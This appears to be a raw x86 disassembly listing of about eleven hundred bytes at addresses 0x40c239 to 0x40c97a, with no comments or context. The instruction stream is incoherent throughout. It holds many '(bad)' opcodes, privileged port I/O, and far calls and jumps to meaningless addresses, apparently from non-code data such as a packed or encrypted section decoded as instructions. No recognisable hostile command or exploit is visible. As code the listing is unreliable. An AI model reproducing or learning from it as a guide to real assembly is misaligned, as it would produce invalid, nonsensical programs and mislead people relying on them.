  40c239:	in     eax,dx
  40c23a:	lahf   
  40c23b:	mov    ss,WORD PTR [ecx]
  40c23d:	repnz stos DWORD PTR es:[edi],eax
  40c23f:	ret    
  40c240:	ds mov ah,0xc9
  40c243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c244:	lods   eax,DWORD PTR ds:[esi]
  40c245:	jmp    0x40c21b
  40c247:	mov    eax,ds:0x35208593
  40c24c:	call   0x8a8b:0xd9d0853d
  40c253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c254:	ins    BYTE PTR es:[edi],dx
  40c255:	(bad)  [ebx-0x51]
  40c258:	lods   eax,DWORD PTR gs:[esi]
  40c25a:	mov    ebp,0xab11d07e
  40c25f:	enter  0x1b22,0x4
  40c263:	pop    edi
  40c264:	pop    eax
  40c265:	adc    BYTE PTR ds:0x65d7244d,0x5a
  40c26c:	ror    DWORD PTR [ebx],cl
  40c26e:	(bad)  
  40c26f:	popf   
  40c270:	das    
  40c271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c272:	imul   esi,DWORD PTR [eax],0xffffff86
  40c275:	fst    DWORD PTR [esi]
  40c277:	lahf   
  40c278:	mov    bh,0x8c
  40c27a:	jg     0x40c217
  40c27c:	out    0x51,eax
  40c27e:	pop    es
  40c27f:	push   esp
  40c280:	mov    al,ds:0xd5a9e3e8
  40c285:	push   ebx
  40c286:	mov    eax,0x799c7843
  40c28b:	add    BYTE PTR [edx+0x1e],bl
  40c28e:	sbb    al,0xdf
  40c290:	call   0x85b5:0xb93e6579
  40c297:	dec    esi
  40c298:	fsub   st(6),st
  40c29a:	adc    BYTE PTR [edi],cl
  40c29c:	cmp    al,0xc9
  40c29e:	dec    ebx
  40c29f:	(bad)  
  40c2a0:	jnp    0x40c2b7
  40c2a2:	jle    0x40c2b0
  40c2a4:	adc    DWORD PTR [ecx+0x6a],esi
  40c2a7:	mov    edi,0xecc5ed36
  40c2ac:	inc    esp
  40c2ad:	mov    DWORD PTR [ebp-0x548fdecd],eax
  40c2b3:	sbb    ebp,DWORD PTR [edi]
  40c2b5:	mov    edi,0xc8eb8e5d
  40c2ba:	fcom   DWORD PTR [ebx+0x3e520e09]
  40c2c0:	rcl    esp,cl
  40c2c2:	iret   
  40c2c3:	fnstsw WORD PTR [ebx+0x75]
  40c2c6:	mov    dh,0x6b
  40c2c8:	loop   0x40c2da
  40c2ca:	mov    cl,0x8e
  40c2cc:	push   edx
  40c2cd:	jnp    0x40c343
  40c2cf:	jbe    0x40c31a
  40c2d1:	and    DWORD PTR [ebx],eax
  40c2d3:	call   0xee08:0xb185074a
  40c2da:	cmp    eax,0xc262e0bf
  40c2df:	stos   DWORD PTR es:[edi],eax
  40c2e0:	adc    eax,0x8ade050e
  40c2e5:	dec    ecx
  40c2e6:	inc    ebx
  40c2e7:	add    bl,dl
  40c2e9:	sub    eax,DWORD PTR [ebp+0x5247db20]
  40c2ef:	stos   BYTE PTR es:[edi],al
  40c2f0:	test   eax,0xeb88bf66
  40c2f5:	ja     0x40c27d
  40c2f7:	into   
  40c2f8:	ins    BYTE PTR es:[edi],dx
  40c2f9:	aad    0x64
  40c2fb:	jo     0x40c35c
  40c2fd:	sub    al,BYTE PTR [ebp-0x6b2e79f1]
  40c303:	mov    ebx,0x8e4282e5
  40c308:	sbb    ebp,DWORD PTR [esi]
  40c30a:	mov    ds:0xcbd48b6e,eax
  40c30f:	sbb    edx,edx
  40c311:	jae    0x40c37a
  40c313:	sbb    dl,bh
  40c315:	outs   dx,BYTE PTR ds:[esi]
  40c316:	fcmovnu st,st(3)
  40c318:	rcl    BYTE PTR [ecx],1
  40c31a:	mul    BYTE PTR [edi+esi*1-0x77]
  40c31e:	in     eax,dx
  40c31f:	loope  0x40c310
  40c321:	mov    dh,0x85
  40c323:	pusha  
  40c324:	lds    ebp,FWORD PTR es:[edi+edi*8-0x714da94d]
  40c32c:	cdq    
  40c32d:	rol    ebp,cl
  40c32f:	mov    DWORD PTR [edi-0x2d7e2c96],eax
  40c335:	sub    al,0x5a
  40c337:	retf   0x723a
  40c33a:	add    edi,edi
  40c33c:	mov    eax,ds:0x320cbb11
  40c341:	add    DWORD PTR [eax+0x3d],esi
  40c344:	enter  0x2d82,0x20
  40c348:	sbb    edx,DWORD PTR [ecx]
  40c34a:	rol    DWORD PTR [eax+0x29],1
  40c34d:	retf   0x3c06
  40c350:	loopne 0x40c363
  40c352:	push   0xebfd4ff0
  40c357:	ret    
  40c358:	xchg   esp,eax
  40c359:	(bad)  
  40c35a:	out    dx,al
  40c35b:	sahf   
  40c35c:	sub    al,0x35
  40c35e:	add    eax,0xfc1f5f26
  40c363:	xor    ebp,DWORD PTR [ecx+0x57781911]
  40c369:	dec    ecx
  40c36a:	push   0x55
  40c36c:	in     al,dx
  40c36d:	out    0x8a,eax
  40c36f:	(bad)  
  40c370:	cmp    ebx,DWORD PTR [edi-0x3d]
  40c373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c374:	fnstcw WORD PTR [ecx]
  40c376:	push   ebp
  40c377:	push   esp
  40c378:	mov    BYTE PTR [esi],bl
  40c37a:	cmp    eax,0x1f54ceb7
  40c37f:	xor    BYTE PTR [eax-0x2d6ebd1f],ah
  40c385:	mov    eax,ds:0xcc3ca871
  40c38a:	adc    ebp,esi
  40c38c:	jae    0x40c3ad
  40c38e:	cmp    eax,0x765ec816
  40c393:	cld    
  40c394:	cmp    BYTE PTR [ebp-0x35],bh
  40c397:	adc    cl,ah
  40c399:	mov    bl,0x51
  40c39b:	push   cs
  40c39c:	sahf   
  40c39d:	test   BYTE PTR [ebx+0x3f],0x49
  40c3a1:	(bad)  
  40c3a2:	push   ds
  40c3a3:	xchg   ecx,eax
  40c3a4:	in     eax,0xcd
  40c3a6:	cmp    ebp,ebx
  40c3a8:	pop    es
  40c3a9:	adc    DWORD PTR ds:0x6c653f18,edx
  40c3af:	test   al,0xc1
  40c3b1:	jb     0x40c36f
  40c3b3:	dec    eax
  40c3b4:	adc    dl,BYTE PTR [edi]
  40c3b6:	pusha  
  40c3b7:	imul   edx,DWORD PTR [edi+0x138e5cee],0x5b
  40c3be:	and    eax,0xc4d2fc17
  40c3c3:	jge    0x40c397
  40c3c5:	call   0x4e722271
  40c3ca:	xor    DWORD PTR [eax],edx
  40c3cc:	cmp    BYTE PTR [ecx],dl
  40c3ce:	cmp    eax,DWORD PTR [edi-0x2ab8b949]
  40c3d4:	jo     0x40c38d
  40c3d6:	out    dx,eax
  40c3d7:	mov    bh,0x13
  40c3d9:	das    
  40c3da:	add    eax,0x9fcad56d
  40c3df:	jmp    0xe6b6d5bd
  40c3e4:	cdq    
  40c3e5:	dec    eax
  40c3e6:	inc    edi
  40c3e7:	fisub  DWORD PTR [ebx]
  40c3e9:	in     eax,dx
  40c3ea:	(bad)  
  40c3ec:	shl    DWORD PTR [ebx+0x7e],cl
  40c3ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3f0:	ins    DWORD PTR es:[edi],dx
  40c3f1:	js     0x40c40c
  40c3f3:	mov    bh,0xa6
  40c3f5:	xchg   ebp,eax
  40c3f6:	jle    0x40c386
  40c3f8:	pop    esp
  40c3f9:	mov    cl,0xf0
  40c3fb:	inc    edx
  40c3fc:	add    BYTE PTR [eax],dl
  40c3fe:	push   ecx
  40c3ff:	popf   
  40c400:	rcl    al,cl
  40c402:	xor    BYTE PTR [ebx],ch
  40c404:	and    eax,0xcdffe07d
  40c409:	adc    ebx,eax
  40c40b:	pop    esp
  40c40c:	loopne 0x40c3c1
  40c40e:	in     al,0xaa
  40c410:	ins    DWORD PTR es:[edi],dx
  40c411:	adc    al,0x92
  40c413:	or     DWORD PTR [esi+ebx*4+0x3d],edx
  40c417:	push   edi
  40c418:	fild   WORD PTR [edx+esi*8+0x50be137a]
  40c41f:	xchg   edi,eax
  40c420:	outs   dx,BYTE PTR ds:[esi]
  40c421:	bound  esi,QWORD PTR ds:0xb1e27e5
  40c427:	and    ebx,ecx
  40c429:	lds    esp,FWORD PTR [ebp+ecx*4-0x4f]
  40c42d:	and    DWORD PTR [eax],edi
  40c42f:	loop   0x40c3f1
  40c431:	sub    ebx,esi
  40c433:	repz rcr BYTE PTR [esi+0x2d],cl
  40c437:	jg     0x40c4b5
  40c439:	imul   esp,ecx,0x67f1a697
  40c43f:	sbb    esp,DWORD PTR [eax+esi*2-0x5c957f54]
  40c446:	adc    ebx,ecx
  40c448:	scas   al,BYTE PTR es:[edi]
  40c449:	stos   BYTE PTR es:[edi],al
  40c44a:	push   es
  40c44b:	stc    
  40c44c:	scas   al,BYTE PTR es:[edi]
  40c44d:	xchg   esi,eax
  40c44e:	inc    ebp
  40c44f:	sub    dl,BYTE PTR [ecx-0x1a71006b]
  40c455:	pop    ebx
  40c456:	jmp    0xcd88eb74
  40c45b:	aad    0xae
  40c45d:	icebp  
  40c45e:	or     bl,0xfe
  40c461:	mov    edx,0xd7c2de45
  40c466:	stc    
  40c467:	lea    esp,[ecx]
  40c469:	sahf   
  40c46a:	ficom  WORD PTR [edi+ecx*8-0x2e252cbe]
  40c471:	rcl    esp,1
  40c473:	dec    eax
  40c474:	sar    cl,cl
  40c476:	cmp    eax,0x901c232a
  40c47b:	int3   
  40c47c:	loopne 0x40c48f
  40c47e:	inc    ebx
  40c47f:	aaa    
  40c480:	mov    ds:0x131b54cf,al
  40c485:	jb     0x40c40b
  40c487:	adc    dl,BYTE PTR [ecx+0x61]
  40c48a:	fstp   DWORD PTR [esi+ecx*8]
  40c48d:	cmp    cl,BYTE PTR [edx+ebx*2+0x85a78a]
  40c494:	sahf   
  40c495:	out    dx,eax
  40c496:	mov    ebx,0x85c881d1
  40c49b:	pop    ecx
  40c49c:	pop    edi
  40c49d:	sbb    BYTE PTR ds:0xd49ea3ff,ah
  40c4a3:	mov    ss,WORD PTR [edi+0x1f37867b]
  40c4a9:	(bad)  [ecx]
  40c4ab:	jg     0x40c47f
  40c4ad:	pushf  
  40c4ae:	mov    eax,ds:0xa3aff3f3
  40c4b3:	mov    ebx,edi
  40c4b5:	adc    al,0x4c
  40c4b7:	mov    ds:0xcc64f914,eax
  40c4bc:	or     cl,al
  40c4be:	mov    WORD PTR ds:[esi],ds
  40c4c1:	adc    cl,BYTE PTR [edx-0x4856dbc8]
  40c4c7:	xchg   esp,eax
  40c4c8:	in     al,dx
  40c4c9:	mov    ds:0x70679f49,eax
  40c4ce:	xlat   BYTE PTR ds:[ebx]
  40c4cf:	mov    WORD PTR [ecx],fs
  40c4d1:	or     eax,0x9ae199a9
  40c4d6:	retf   0xbc8b
  40c4d9:	xchg   ecx,eax
  40c4da:	push   ebx
  40c4db:	das    
  40c4dc:	inc    ebp
  40c4dd:	outs   dx,BYTE PTR cs:[esi]
  40c4df:	cmp    DWORD PTR [ebx+0x1e],0xffffff9b
  40c4e3:	into   
  40c4e4:	sub    DWORD PTR [ecx+0x3e],edx
  40c4e7:	cmp    eax,0xee846bff
  40c4ec:	out    0xc7,eax
  40c4ee:	xor    DWORD PTR [edi-0x724335fc],edi
  40c4f4:	push   ss
  40c4f5:	into   
  40c4f6:	lods   al,BYTE PTR ds:[esi]
  40c4f7:	cli    
  40c4f8:	ret    0xb2e9
  40c4fb:	scas   al,BYTE PTR es:[edi]
  40c4fc:	or     dh,ch
  40c4fe:	test   DWORD PTR [edi+0x151add39],ebx
  40c504:	inc    eax
  40c505:	inc    eax
  40c506:	xor    DWORD PTR [edx-0x6c961876],0x4
  40c50d:	push   0x18
  40c50f:	int3   
  40c510:	sub    BYTE PTR [ebx+0x55c10952],0x40
  40c517:	rcr    BYTE PTR fs:[edx],0x85
  40c51b:	or     BYTE PTR [eax+0x16],cl
  40c51e:	xor    eax,0xec19e593
  40c523:	pop    ds
  40c524:	and    eax,0xd30b2a99
  40c529:	bound  esp,QWORD PTR [edi+0x79]
  40c52c:	jbe    0x40c590
  40c52e:	je     0x40c521
  40c530:	mov    ds:0x4f912d01,al
  40c535:	int3   
  40c536:	or     bl,BYTE PTR [ecx+ebx*4]
  40c539:	pop    esi
  40c53a:	test   esi,eax
  40c53c:	pop    esp
  40c53d:	inc    ecx
  40c53e:	lods   al,BYTE PTR ds:[esi]
  40c53f:	xor    ah,BYTE PTR [esi-0x22a77bae]
  40c545:	arpl   di,bp
  40c547:	iret   
  40c548:	pop    ebx
  40c549:	adc    ebp,ebp
  40c54b:	mov    es,WORD PTR [ebx]
  40c54d:	lds    esp,FWORD PTR [esi+0x4d]
  40c550:	mov    edx,0xd28776ac
  40c555:	cli    
  40c556:	out    dx,al
  40c557:	lods   eax,DWORD PTR ds:[esi]
  40c558:	cs pop ds
  40c55a:	cmovb  edx,DWORD PTR [eax-0x14]
  40c55e:	add    al,0xde
  40c560:	rcl    DWORD PTR [ecx],1
  40c562:	shr    BYTE PTR [edi],cl
  40c564:	cli    
  40c565:	into   
  40c566:	inc    eax
  40c567:	dec    edi
  40c568:	js     0x40c502
  40c56a:	test   eax,eax
  40c56c:	sub    BYTE PTR [edi-0x27f9e038],dh
  40c572:	neg    BYTE PTR [eax-0x6b42f636]
  40c578:	xchg   edx,eax
  40c579:	les    ecx,FWORD PTR [edx+edi*2+0x598945a5]
  40c580:	cmp    DWORD PTR [ecx],edx
  40c582:	sbb    ebp,DWORD PTR [eax-0x11a27b8f]
  40c588:	xchg   esi,eax
  40c589:	mov    eax,ds:0xe6d1f0c0
  40c58e:	stos   BYTE PTR es:[edi],al
  40c58f:	lea    esi,ds:0xa0c6de83
  40c595:	cmp    BYTE PTR [edx-0x7abc28a2],cl
  40c59b:	xchg   ecx,eax
  40c59c:	sub    BYTE PTR [ebx-0x76],0x78
  40c5a0:	lods   al,BYTE PTR fs:[esi]
  40c5a2:	pop    ebp
  40c5a3:	xor    al,BYTE PTR [eax+0x1e]
  40c5a6:	aam    0x1f
  40c5a8:	inc    edi
  40c5a9:	sti    
  40c5aa:	cli    
  40c5ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5ac:	add    eax,0x1df18590
  40c5b1:	mov    cl,0xab
  40c5b3:	lds    esi,FWORD PTR [ecx-0x58]
  40c5b6:	fwait
  40c5b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5b8:	xchg   edi,eax
  40c5b9:	mov    bl,0x88
  40c5bb:	pusha  
  40c5bc:	cmp    esi,edi
  40c5be:	cs ret 0xe6b2
  40c5c2:	push   cs
  40c5c3:	fcmovbe st,st(3)
  40c5c5:	jle    0x40c63a
  40c5c7:	test   eax,0xe64fd4d0
  40c5cc:	adc    cl,BYTE PTR [ebp+ecx*8+0xd1e7dd2]
  40c5d3:	cmp    DWORD PTR [ebp-0x65ec9a0a],esi
  40c5d9:	add    ecx,DWORD PTR [ebx-0xf0f5a6f]
  40c5df:	adc    eax,0x304dfe95
  40c5e4:	mov    edx,0xa68d074a
  40c5e9:	mov    cl,0x43
  40c5eb:	jle    0x40c60f
  40c5ed:	repnz das 
  40c5ef:	lds    edx,FWORD PTR [ecx]
  40c5f1:	jp     0x40c58f
  40c5f3:	ins    DWORD PTR es:[edi],dx
  40c5f4:	cmp    al,0x49
  40c5f6:	test   DWORD PTR [ecx],esp
  40c5f8:	xlat   BYTE PTR ds:[ebx]
  40c5f9:	ins    BYTE PTR es:[edi],dx
  40c5fa:	jle    0x40c58d
  40c5fc:	sub    BYTE PTR [esi],ch
  40c5fe:	lods   eax,DWORD PTR ds:[esi]
  40c5ff:	dec    ebp
  40c600:	das    
  40c601:	and    eax,0x62d24a9e
  40c606:	mov    eax,ds:0xf5080dda
  40c60b:	mov    dl,cl
  40c60d:	ret    0xed65
  40c610:	and    ah,BYTE PTR [ecx-0x4c]
  40c613:	cwde   
  40c614:	mov    WORD PTR [edi+ebx*8-0x63f00d0c],es
  40c61b:	push   es
  40c61c:	pop    edx
  40c61d:	(bad)  
  40c61e:	xchg   edx,eax
  40c61f:	inc    edx
  40c620:	aad    0x10
  40c622:	cmc    
  40c623:	daa    
  40c624:	aaa    
  40c625:	push   edx
  40c626:	dec    edi
  40c627:	xor    al,0xac
  40c629:	jno    0x40c5b4
  40c62b:	mov    ebx,esp
  40c62d:	adc    DWORD PTR [ecx-0x25eb3380],eax
  40c633:	jb     0x40c668
  40c635:	or     al,BYTE PTR [ebx+edi*8-0x450d24d5]
  40c63c:	xchg   edx,eax
  40c63d:	mov    BYTE PTR [ebx-0x56efc6c8],bh
  40c643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c644:	mov    ds,WORD PTR [edi+0x3eba27e8]
  40c64a:	jmp    0xa04f9863
  40c64f:	jmp    0x40c633
  40c651:	cmc    
  40c652:	add    al,bl
  40c654:	(bad)  
  40c655:	push   ds
  40c656:	inc    esp
  40c657:	out    dx,eax
  40c658:	xor    eax,0x4b16fcc4
  40c65d:	cs cmp eax,0x8538256b
  40c663:	mov    ds:0x9c273ef5,al
  40c668:	push   ebp
  40c669:	std    
  40c66a:	ins    DWORD PTR es:[edi],dx
  40c66b:	mov    ss,WORD PTR [edi]
  40c66d:	inc    ecx
  40c66e:	iret   
  40c66f:	sbb    dl,BYTE PTR [eax-0x5215e1ec]
  40c675:	mov    ecx,0x2bdbccf2
  40c67a:	dec    edx
  40c67b:	ss jge 0x40c638
  40c67e:	sbb    ecx,DWORD PTR [esi-0x17bd4a30]
  40c684:	dec    edx
  40c685:	fnstsw WORD PTR [edx+0x6e46a93e]
  40c68b:	push   ebp
  40c68c:	inc    ebx
  40c68d:	pop    edx
  40c68e:	in     al,0xa0
  40c690:	test   al,0x61
  40c692:	fsubr  DWORD PTR [eax-0xf]
  40c695:	add    bl,BYTE PTR [ecx]
  40c697:	into   
  40c698:	aas    
  40c699:	xchg   ecx,eax
  40c69a:	xor    al,0x74
  40c69c:	les    ecx,FWORD PTR [eax-0x50]
  40c69f:	inc    ecx
  40c6a0:	sar    DWORD PTR [ecx+0x16],cl
  40c6a3:	int    0x6d
  40c6a5:	popf   
  40c6a6:	leave  
  40c6a7:	(bad)  
  40c6a8:	mov    esi,0x944a562f
  40c6ad:	jae    0x40c633
  40c6af:	es sub al,0x27
  40c6b2:	xor    ch,BYTE PTR [ecx-0x2e10e7ee]
  40c6b8:	jnp    0x40c676
  40c6ba:	test   DWORD PTR [edx],ebx
  40c6bc:	cmp    DWORD PTR [edi+0x119778d3],ebx
  40c6c2:	mov    edi,0x3467ec0f
  40c6c7:	dec    eax
  40c6c8:	imul   ebp,ecx,0x31738a87
  40c6ce:	push   esp
  40c6cf:	inc    esp
  40c6d0:	push   es
  40c6d1:	add    ah,BYTE PTR [ecx]
  40c6d3:	or     al,BYTE PTR [ecx-0x37d3f36f]
  40c6d9:	inc    eax
  40c6da:	dec    ebp
  40c6db:	push   eax
  40c6dc:	ror    cl,cl
  40c6de:	sbb    esi,DWORD PTR ds:0x2eb77951
  40c6e4:	xlat   BYTE PTR ds:[ebx]
  40c6e5:	adc    DWORD PTR [ebp+0x6c],ebp
  40c6e8:	push   ebx
  40c6e9:	(bad)  
  40c6eb:	or     ecx,ebp
  40c6ed:	pop    ss
  40c6ee:	test   esp,esi
  40c6f0:	mov    eax,0x5245d1ea
  40c6f5:	cwde   
  40c6f6:	push   ss
  40c6f7:	mov    fs,WORD PTR [edx+eiz*4+0x50e03df5]
  40c6fe:	lds    ebx,FWORD PTR [esi]
  40c700:	(bad)  
  40c701:	xor    DWORD PTR [ebx],eax
  40c703:	adc    dl,0xa
  40c706:	stc    
  40c707:	outs   dx,BYTE PTR ds:[esi]
  40c708:	sub    ebx,ebp
  40c70a:	push   esi
  40c70b:	mov    gs,edx
  40c70d:	frstor [esi+0x2833e2d7]
  40c713:	idiv   dl
  40c715:	and    esi,DWORD PTR [esi-0x7a2fdad5]
  40c71b:	ins    DWORD PTR es:[edi],dx
  40c71c:	xor    BYTE PTR [esi],cl
  40c71e:	ins    DWORD PTR es:[edi],dx
  40c71f:	push   eax
  40c720:	imul   esp,DWORD PTR [ebx+0x4b],0xffffff8e
  40c724:	and    BYTE PTR [esi-0x524beda1],al
  40c72a:	loopne 0x40c740
  40c72c:	shl    al,cl
  40c72e:	or     dl,0xe2
  40c731:	and    DWORD PTR [ebx+0x5911d953],0x5064dda5
  40c73b:	nop
  40c73c:	cmc    
  40c73d:	add    BYTE PTR [ebp-0x40b5ca58],0xcb
  40c744:	push   eax
  40c745:	jl     0x40c784
  40c747:	dec    DWORD PTR [edi+esi*2+0x7c895a7]
  40c74e:	and    eax,0x22955227
  40c753:	imul   ebp,DWORD PTR [edi-0x6b7b7ba7],0xffffffb7
  40c75a:	scas   al,BYTE PTR es:[edi]
  40c75b:	nop
  40c75c:	outs   dx,BYTE PTR ds:[esi]
  40c75d:	shl    BYTE PTR [eax],0xaa
  40c760:	lods   al,BYTE PTR ds:[esi]
  40c761:	fwait
  40c762:	add    eax,0x5d3aa3a1
  40c767:	jp     0x40c7bf
  40c769:	jb     0x40c6ef
  40c76b:	jecxz  0x40c775
  40c76d:	push   cs
  40c76e:	inc    edi
  40c76f:	dec    edx
  40c770:	mov    eax,ds:0xeb9f9f1e
  40c775:	mov    ah,BYTE PTR [esp+ebp*2+0x5c43f8b2]
  40c77c:	in     eax,0x7b
  40c77e:	test   BYTE PTR [edi+0x42],bl
  40c781:	mov    ecx,0xc2d82c87
  40c786:	arpl   WORD PTR [esi+0x77ea5814],cx
  40c78c:	(bad)  
  40c78d:	push   esp
  40c78e:	addr16 js 0x40c763
  40c791:	cmc    
  40c792:	sub    BYTE PTR [ebx],al
  40c794:	mov    ds:0x2e363ab8,al
  40c799:	push   ds
  40c79a:	dec    ebx
  40c79b:	lods   al,BYTE PTR ds:[esi]
  40c79c:	sub    eax,0x9f2594df
  40c7a1:	xor    BYTE PTR [eax-0x17bef5ef],cl
  40c7a7:	push   ebp
  40c7a8:	call   0x4211:0xdf3757a1
  40c7af:	push   esp
  40c7b0:	ss into 
  40c7b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7b3:	mov    dl,0x8e
  40c7b5:	out    dx,al
  40c7b6:	test   DWORD PTR [ebx-0x658f9542],ecx
  40c7bc:	jne    0x40c780
  40c7be:	loop   0x40c816
  40c7c0:	fimul  DWORD PTR [eax]
  40c7c2:	test   bh,ah
  40c7c4:	xchg   BYTE PTR [eax-0x6f],dl
  40c7c7:	inc    ebx
  40c7c8:	or     eax,0x666e8552
  40c7cd:	aas    
  40c7ce:	sub    BYTE PTR [eax+0xc],dh
  40c7d1:	lods   eax,DWORD PTR ds:[esi]
  40c7d2:	pop    ebp
  40c7d3:	sub    bl,cl
  40c7d5:	jmp    0xb2d0:0x87428d45
  40c7dc:	fs fs mov esp,0x85dacde6
  40c7e3:	je     0x40c770
  40c7e5:	push   edi
  40c7e6:	and    BYTE PTR [esi],bh
  40c7e8:	stos   DWORD PTR es:[edi],eax
  40c7e9:	dec    ebp
  40c7ea:	sub    al,0xa8
  40c7ec:	iret   
  40c7ed:	mov    al,ds:0xdd63cc04
  40c7f2:	jb     0x40c812
  40c7f4:	pop    ebx
  40c7f5:	out    dx,eax
  40c7f6:	cmc    
  40c7f7:	ret    
  40c7f8:	sar    BYTE PTR ds:0x22798c1,cl
  40c7fe:	rcr    BYTE PTR [eax+ebx*1],cl
  40c801:	adc    DWORD PTR [edx+eiz*8],ebx
  40c804:	mov    bl,0xa8
  40c806:	mov    ch,0xc8
  40c808:	cld    
  40c809:	xor    dl,dl
  40c80b:	(bad)  
  40c80d:	in     eax,0x6b
  40c80f:	clc    
  40c810:	out    dx,eax
  40c811:	mov    al,0xec
  40c813:	(bad)  
  40c814:	lods   al,BYTE PTR ds:[esi]
  40c815:	cmp    BYTE PTR [ecx+0x5d78538a],bl
  40c81b:	pop    ecx
  40c81c:	xchg   esi,eax
  40c81d:	ins    BYTE PTR es:[edi],dx
  40c81e:	pop    esp
  40c81f:	popf   
  40c820:	pop    es
  40c821:	or     DWORD PTR [ecx-0x1b],edx
  40c824:	ror    BYTE PTR [eax-0x5b],cl
  40c827:	outs   dx,DWORD PTR ds:[esi]
  40c828:	mov    bh,0xe6
  40c82a:	cdq    
  40c82b:	cld    
  40c82c:	icebp  
  40c82d:	and    bh,al
  40c82f:	(bad)  
  40c831:	cmp    ch,BYTE PTR ds:0x6d547a88
  40c837:	sub    BYTE PTR [ebp-0x6b809805],0x5
  40c83e:	pop    ecx
  40c83f:	fimul  WORD PTR [edx+0x1b]
  40c842:	loopne 0x40c7dc
  40c844:	int    0x45
  40c846:	mov    ch,0x75
  40c848:	adc    ch,BYTE PTR [esi]
  40c84a:	jbe    0x40c8c2
  40c84c:	pop    ebp
  40c84d:	rol    DWORD PTR [ebp+0x54bc8041],0xe6
  40c854:	pop    ss
  40c855:	xor    eax,0x6e79930f
  40c85a:	in     al,0x91
  40c85c:	ret    
  40c85d:	adc    cl,BYTE PTR [ebp-0x48]
  40c860:	out    dx,eax
  40c861:	mov    DWORD PTR [ebp-0x6238b338],0x28cd28a0
  40c86b:	(bad)  
  40c86c:	adc    DWORD PTR cs:[esi+ecx*1],0x67812caa
  40c874:	loop   0x40c82a
  40c876:	test   DWORD PTR [edi+0x4],edx
  40c879:	xor    DWORD PTR es:[esi-0x71a7c5f5],0x70
  40c881:	cmp    eax,0x1f83b5f3
  40c886:	cmp    ebp,DWORD PTR [ebx]
  40c888:	rcr    dl,cl
  40c88a:	inc    ebp
  40c88b:	mov    ds:0x8b8e8989,al
  40c890:	(bad)  
  40c891:	adc    DWORD PTR [edi+0x52],ebp
  40c894:	(bad)  [edx]
  40c896:	add    dh,BYTE PTR [eax]
  40c898:	push   esi
  40c899:	cli    
  40c89a:	test   DWORD PTR [ecx+0x46a8df45],esp
  40c8a0:	bound  ecx,QWORD PTR [edi-0x475873ed]
  40c8a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8a7:	xor    DWORD PTR ds:0x31b9eafa,edx
  40c8ad:	jns    0x40c8ee
  40c8af:	sub    al,0x8e
  40c8b1:	add    DWORD PTR [ebp+0x6a33703f],0xffffff88
  40c8b8:	das    
  40c8b9:	add    cl,BYTE PTR [edx]
  40c8bb:	mov    gs,WORD PTR [esi]
  40c8bd:	sub    ebx,DWORD PTR [ecx+ebp*2+0x52]
  40c8c1:	push   ebx
  40c8c2:	jg     0x40c940
  40c8c4:	shr    BYTE PTR [ebx],cl
  40c8c6:	js     0x40c886
  40c8c8:	cmp    eax,edx
  40c8ca:	ds out 0x9c,al
  40c8cd:	adc    esi,esi
  40c8cf:	pop    edi
  40c8d0:	imul   edx,DWORD PTR [edi],0x53
  40c8d3:	int3   
  40c8d4:	pusha  
  40c8d5:	push   ebp
  40c8d6:	(bad)  
  40c8d7:	push   edi
  40c8d8:	mov    ebx,0x1b577e74
  40c8dd:	cs gs adc dl,ch
  40c8e1:	jns    0x40c8de
  40c8e3:	mov    ss,WORD PTR [edx-0x578d2f2b]
  40c8e9:	stos   BYTE PTR es:[edi],al
  40c8ea:	mov    ah,0x5e
  40c8ec:	inc    ecx
  40c8ed:	fidivr WORD PTR [edi+0x4a]
  40c8f0:	int3   
  40c8f1:	adc    ebx,DWORD PTR [esi]
  40c8f3:	push   es
  40c8f4:	outs   dx,BYTE PTR ds:[esi]
  40c8f5:	jns    0x40c879
  40c8f7:	call   0x4f890a29
  40c8fc:	sbb    bl,0x4d
  40c8ff:	fdiv   QWORD PTR [ebx+0x19f6032e]
  40c905:	repz out dx,al
  40c907:	mov    dh,0xf5
  40c909:	mov    DWORD PTR ds:0x58ff249a,0x1511acf6
  40c913:	pop    ds
  40c914:	xlat   BYTE PTR ds:[ebx]
  40c915:	lods   eax,DWORD PTR ds:[esi]
  40c916:	adc    al,0xba
  40c918:	fdivr  QWORD PTR [edi-0x276fde7b]
  40c91e:	stc    
  40c91f:	lods   al,BYTE PTR ds:[esi]
  40c920:	iret   
  40c921:	scas   eax,DWORD PTR es:[edi]
  40c922:	xlat   BYTE PTR ds:[ebx]
  40c923:	mov    ds,ecx
  40c925:	test   dh,cl
  40c927:	mov    ch,0xf7
  40c929:	inc    ecx
  40c92a:	sar    BYTE PTR [eax-0x2e],0xc7
  40c92e:	std    
  40c92f:	sar    ch,1
  40c931:	and    al,0x88
  40c933:	lods   eax,DWORD PTR ds:[esi]
  40c934:	pop    es
  40c935:	push   ds
  40c936:	xor    al,0xe0
  40c938:	repnz retf 
  40c93a:	and    ch,BYTE PTR [edx]
  40c93c:	shl    DWORD PTR [ebp+0x31],1
  40c93f:	stos   DWORD PTR es:[edi],eax
  40c940:	jb     0x40c991
  40c942:	sbb    DWORD PTR [eax+0x3c],edi
  40c945:	scas   al,BYTE PTR es:[edi]
  40c946:	test   DWORD PTR [ebp+ecx*1+0x35],edx
  40c94a:	pop    ecx
  40c94b:	jmp    0x2aac:0x8ec2b9be
  40c952:	std    
  40c953:	fwait
  40c954:	lahf   
  40c955:	fild   WORD PTR [edi-0x54]
  40c958:	sar    BYTE PTR [ebx-0x3d],cl
  40c95b:	xchg   edi,eax
  40c95c:	adc    ecx,DWORD PTR [edi]
  40c95e:	sahf   
  40c95f:	xor    BYTE PTR [ecx+edx*1],bh
  40c962:	cdq    
  40c963:	shl    BYTE PTR [eax],0x92
  40c966:	dec    ecx
  40c967:	test   al,0xaa
  40c969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c96a:	jmp    0xc4e7e13b
  40c96f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c970:	sub    BYTE PTR [esi],dh
  40c972:	cmc    
  40c973:	fiadd  WORD PTR [eax+0x46]
  40c976:	mov    esp,gs
  40c978:	js     0x40c99e
  40c97a:	push   es
